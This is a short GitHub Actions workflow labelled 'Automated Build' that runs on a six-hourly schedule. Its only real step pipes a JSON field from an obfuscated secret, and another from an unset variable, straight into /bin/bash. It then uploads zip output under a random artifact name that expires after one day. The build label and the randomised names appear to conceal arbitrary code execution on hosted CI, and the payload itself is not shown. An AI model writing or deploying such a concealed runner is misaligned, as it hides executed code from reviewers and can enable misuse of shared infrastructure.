name: Automated Build
on:
  workflow_dispatch:

  schedule:
    - cron: '59 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          xd027: ${{ secrets.xd027 }}
        run: |
          printf '%s' "$xd027" | jq -r .zigf226 | /bin/bash
          echo $yif32588 | jq -r .cpsp47 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: lOajHRzJ
          path: "*.zip"
          retention-days: 1
